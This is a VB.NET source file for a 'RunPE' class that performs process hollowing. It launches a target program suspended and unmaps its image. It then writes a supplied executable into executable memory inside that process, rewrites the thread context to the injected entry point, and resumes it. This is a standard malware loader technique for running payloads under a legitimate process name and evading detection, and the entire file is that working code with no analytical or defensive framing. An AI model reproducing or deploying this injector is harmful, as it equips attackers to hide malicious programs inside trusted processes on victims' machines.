Imports System.ComponentModel
Imports System.IO
Imports System.Runtime.InteropServices
Public Class RunPE
    Public Const CREATE_SUSPENDED = &H4
    Public Shared Function Start(lpBuffer() As Byte, targetexe As String) As Boolean


        Dim emulatedi386 As Boolean = False
        Dim currentDir As String = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)

        Dim baseAddress As IntPtr = Marshal.AllocHGlobal(lpBuffer.Length)
        Marshal.Copy(lpBuffer, 0, baseAddress, lpBuffer.Length)

        Dim dosHeader As IMAGE_DOS_HEADER = Marshal.PtrToStructure(baseAddress, GetType(IMAGE_DOS_HEADER))
        Dim nt_header_ptr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew)
        Dim ntHeaders As IMAGE_NT_HEADERS32 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS32))

        Dim si As New STARTUPINFO()
        Dim pi As New PROCESS_INFORMATION()
        Dim hRet = CreateProcess(targetexe, 0, 0, IntPtr.Zero, False, CREATE_SUSPENDED, IntPtr.Zero, Nothing, si, pi)
        If hRet = False Then
            GoTo retexit
        End If
        Dim hHandle = OpenProcess(PROCESS_ALL_ACCESS Or PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, pi.dwProcessId)

        Dim pImageBase As IntPtr
        If IsWow64Process(pi.hProcess, emulatedi386) Then
            pImageBase = New IntPtr(ntHeaders.OptionalHeader.ImageBase)
            NtUnmapViewOfSection(pi.hProcess, pImageBase)
        End If


        If VirtualAllocEx(hHandle, pImageBase, ntHeaders.OptionalHeader.SizeOfImage, &H3000UI, &H40UI) = IntPtr.Zero Then
            GoTo retexit
        End If

        If Not WriteProcessMemory(hHandle, pImageBase, baseAddress, ntHeaders.OptionalHeader.SizeOfHeaders, IntPtr.Zero) Then
            GoTo retexit
        End If


        For i = 0 To ntHeaders.FileHeader.NumberOfSections - 1
            Dim imageSectionPtr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew + Marshal.SizeOf(New IMAGE_NT_HEADERS32) + i * Marshal.SizeOf(New IMAGE_SECTION_HEADER))
            Dim section As IMAGE_SECTION_HEADER = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
            If Not WriteProcessMemory(hHandle, IntPtr.Add(pImageBase, section.VirtualAddress), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
                GoTo retexit
            End If
        Next


        Dim context As New CONTEXT32()
        context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL


        If emulatedi386 Then
            If Not Wow64GetThreadContext32(pi.hThread, context) Then
                GoTo retexit
            End If
        Else
            If Not GetThreadContext32(pi.hThread, context) Then
                GoTo retexit
            End If
        End If

        Dim ptr As IntPtr = Marshal.AllocHGlobal(8)
        Marshal.WriteInt64(ptr, ntHeaders.OptionalHeader.ImageBase)
        If Not WriteProcessMemory(hHandle, New IntPtr(context.Ebx + 8), ptr, 4, IntPtr.Zero) Then
            GoTo retexit
        End If
        Marshal.FreeHGlobal(ptr)
        context.Eax = pImageBase.ToInt64 + ntHeaders.OptionalHeader.AddressOfEntryPoint

        If emulatedi386 Then
            If Not Wow64SetThreadContext32(pi.hThread, context) Then
                GoTo retexit
            End If
        Else
            If Not SetThreadContext32(pi.hThread, context) Then
                GoTo retexit
            End If
        End If

retexit:
        ResumeThread(pi.hThread)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        Marshal.FreeHGlobal(baseAddress)
        Return True
    End Function


End Class
